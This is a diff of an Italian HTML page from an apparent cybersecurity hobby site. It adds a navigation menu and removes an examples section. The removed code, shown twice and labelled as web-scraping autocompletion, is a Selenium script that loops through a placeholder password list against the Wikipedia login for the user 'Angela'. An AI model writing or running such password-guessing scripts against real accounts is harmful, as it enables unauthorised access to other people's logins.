@@ -1,5 +1,12 @@
 <!DOCTYPE html>
 <html lang="en">
+<div class="menu">
+        <a href="index.html">Home</a>
+        <a href="cybersecurity.html">Cybersecurity</a>
+        <a href="kali-linux.html">Kali Linux</a>
+        <a href="esempi.html">Esempi</a>
+</div>
+    
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -90,154 +97,11 @@
 
     <h2>Esempi di esercizi</h2>
     <ul>
-    <h3>1) Webscraping autocompilazione</h3>
-
-        <a href="codice.html">Webscraping autocompilazione</a>
-
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pagina HTML con Codice e Commento</title>
-    <style>
-        body {
-            background-color: black;
-            color: white;
-            font-family: Arial, sans-serif;
-        }
-
-        .container {
-            background-color: #333;
-            padding: 20px;
-            margin: 20px;
-            border: 2px solid white;
-        }
-
-        code {
-            display: block;
-            color: #00FF00; /* Colore verde */
-            font-size: 14px;
-            white-space: pre-wrap;
-            overflow-x: auto;
-        }
-
-        .comment {
-            background-color: black;
-            color: #FF00FF; /* Colore magenta */
-            padding: 10px;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <code>
-from selenium import webdriver
-from selenium.webdriver.common.by import By
-
-lista_parole = ["parola1", "parola2", "parola3", "parola4", "parola5", "parola6", "parola7", "parola8", "parola9", "parola10"]
-
-# Inizializza il driver del browser (per esempio, Chrome)
-driver = webdriver.Chrome()
-
-# Apri la pagina web
-url = "https://it.wikipedia.org/wiki/Pagina_principale"
-driver.get(url)
-
-# Effettua il clic sul link con l'ID "pt-login"
-login_link = driver.find_element(By.ID, "pt-login")
-login_link.click()
-
-# Trova l'elemento del campo di input per il nome utente utilizzando l'ID
-username_field = driver.find_element(By.ID, "wpName1")
-username_field.send_keys("Angela")
-
-# Itera attraverso la lista delle password
-for password in lista_parole:
-    try:
-        # Trova l'elemento del campo di input per la password utilizzando l'ID
-        password_field = driver.find_element(By.ID, "wpPassword1")
-        password_field.clear()  # Pulisci il campo di input precedente
-        password_field.send_keys(password)
-
-        # Trova il pulsante di login utilizzando l'ID e fai clic su di esso
-        login_button = driver.find_element(By.ID, "wpLoginAttempt")
-        login_button.click()
-
-        # Verifica se il login è riuscito
-        if "Benvenuto" in driver.page_source:
-            print("Login riuscito con la password:", password)
-            break  # Esci dal ciclo se il login ha successo
-        else:
-            print("Login fallito con la password:", password)
-
-    except:
-        print("Si è verificato un errore durante il login con la password:", password)
-
-# Chiudi il browser
-driver.quit()
-        </code>
-    </div>
-
-    <div class="comment">
-        <p>Questo è un commento sul codice. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec convallis, tortor ut interdum commodo, dui erat posuere risus, at fringilla nibh odio eget dolor.</p>
-    </div>
-</body>
-</html>
-
-        
-
-        <pre><code>
-        <span style="color: green"># Importa i moduli necessari</span>
-        <span style="color: green">from selenium import webdriver</span>
-        <span style="color: green">from selenium.webdriver.common.by import By</span>
-
-        <span style="color: green"># Definisci una lista di parole</span>
-        <span style="color: green">lista_parole = ["parola1", "parola2", "parola3", "parola4", "parola5", "parola6", "parola7", "parola8", "parola9", "parola10"]</span>
-
-        <span style="color: green"># Inizializza il driver del browser (per esempio, Chrome)</span>
-        <span style="color: green">driver = webdriver.Chrome()</span>
-
-        <span style="color: green"># Apri la pagina web</span>
-        <span style="color: green">url = "https://it.wikipedia.org/wiki/Pagina_principale"</span>
-        <span style="color: green">driver.get(url)</span>
-
-        <span style="color: green"># Effettua il clic sul link con l'ID "pt-login"</span>
-        <span style="color: green">login_link = driver.find_element(By.ID, "pt-login")</span>
-        <span style="color: green">login_link.click()</span>
-
-        <span style="color: green"># Trova l'elemento del campo di input per il nome utente utilizzando l'ID</span>
-        <span style="color: green">username_field = driver.find_element(By.ID, "wpName1")</span>
-        <span style="color: green">username_field.send_keys("Angela")</span>
-
-        <span style="color: green"># Itera attraverso la lista delle password</span>
-        <span style="color: green">for password in lista_parole:</span>
-        <span style="color: green">    try:</span>
-        <span style="color: green">        # Trova l'elemento del campo di input per la password utilizzando l'ID</span>
-        <span style="color: green">        password_field = driver.find_element(By.ID, "wpPassword1")</span>
-        <span style="color: green">        password_field.clear()  <span style="color: red"># Pulisci il campo di input precedente</span></span>
-        <span style="color: green">        password_field.send_keys(password)</span>
-
-        <span style="color: green">        # Trova il pulsante di login utilizzando l'ID e fai clic su di esso</span>
-        <span style="color: green">        login_button = driver.find_element(By.ID, "wpLoginAttempt")</span>
-        <span style="color: green">        login_button.click()</span>
-
-        <span style="color: green">        # Verifica se il login è riuscito</span>
-        <span style="color: green">        if "Benvenuto" in driver.page_source:</span>
-        <span style="color: green">            print("Login riuscito con la password:", password)</span>
-        <span style="color: green">            break  <span style="color: red"># Esci dal ciclo se il login ha successo</span></span>
-        <span style="color: green">        else:</span>
-        <span style="color: green">            print("Login fallito con la password:", password)</span>
-
-        <span style="color: green">    except:</span>
-        <span style="color: green">        print("Si è verificato un errore durante il login con la password:", password)</span>
-
-        <span style="color: green"># Attendi l'input dell'utente prima di chiudere il browser</span>
-        <span style="color: green">input("Premi invio per chiudere il browser...")</span>
-
-        <span style="color: green"># Chiudi il browser</span>
-        <span style="color: green">driver.quit()</span>
-</code></pre>
-        
+        <h3>1) 
+            <a href="codice.html">Webscraping autocompilazione</a>
+        </h3>
     </ul>
     
+
 </body>
 </html>
